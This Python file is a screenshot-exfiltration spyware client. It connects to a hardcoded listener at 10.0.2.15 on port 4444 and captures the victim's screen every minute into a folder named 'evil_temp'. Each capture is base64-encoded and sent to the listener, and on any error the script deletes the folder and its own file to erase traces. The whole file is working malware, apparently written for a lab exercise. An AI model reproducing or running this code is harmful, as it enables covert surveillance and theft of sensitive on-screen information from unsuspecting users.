import socket
import pyautogui
import os
import datetime
import time
import sys
import base64
import json
import shutil

server_ip = "10.0.2.15" # chnage ip address
port = 4444 # change port number
address = (server_ip, port)
size = 1024
format = "utf-8"

def make_connection():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(address)
        return client
    # If a connection can't be established, exit
    except:
        sys.exit()

def make_directory():
    directory = "evil_temp/"
    parent_dir = "C:/"
    path = os.path.join(parent_dir, directory)
    try:
        os.mkdir(path)
        return path
    # If the path already exists
    except:
        return path

def take_screenshot(path, filename):
    screenshot = pyautogui.screenshot()
    file_path = path + filename + ".jpg"
    screenshot.save(file_path)
    return file_path

def generate_filename():
    now = datetime.datetime.now()
    return now.strftime("%Y_%m_%d_%H_%M_%S")

if __name__ == '__main__':
    path = make_directory()
    client = make_connection()
    try:
        while True:
            filename = generate_filename()
            pic_name = filename + ".jpg"
            picture_path = take_screenshot(path, filename)
            client.send(pic_name.encode(format))
            print(picture_path)
            with open(picture_path, "rb") as file:
                pic = file.read()
            data = base64.b64encode(pic)
            json_data = json.dumps(data.decode(format))
            client.send(json_data.encode(format))
            time.sleep(60)
    # If anything goes wrong, delete the screenshot folder and this file itself
    except:
        self_path = os.path.abspath(__file__)
        shutil.rmtree(path)
        os.remove(self_path)
        exit()